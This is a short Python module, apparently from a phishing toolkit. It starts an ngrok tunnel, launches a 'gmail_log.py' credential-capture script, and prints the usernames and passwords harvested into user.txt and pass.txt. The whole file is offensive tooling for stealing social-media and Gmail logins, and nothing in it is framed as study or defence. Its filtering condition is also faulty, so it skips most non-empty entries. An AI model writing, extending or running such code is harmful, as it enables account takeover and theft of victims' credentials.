import time
import os

from mod.system.get_ngrok import start, get

def atk():
    path = input("[ENTER] enter the full path to ngrok: ")
    start(path)
    time.sleep(10)
    get()

    print("[INSTA] when done close both windows or they will run for ever")
    print("[INSTA] running...")
    command = "python3 mod/system/social_system/gmail_log.py"
    os.system(command)

    user = open("user.txt","r").readlines()
    pas = open("pass.txt","r").readlines()
    
    x = len(user)
    os.system("clear")

    for c in range(x):
        u = user[c]
        u = u.replace("\n","")
        p = pas[c]
        p = p.replace("\n","")
        
        if p or u == "NULL00":
            pass
        else:
            print("=====================")
            print("USER: ", u)
            print("PASS: ", p)
            print("NUM: ", c)
            print("=====================")
    input("[ENTER] hit enter to continue: ")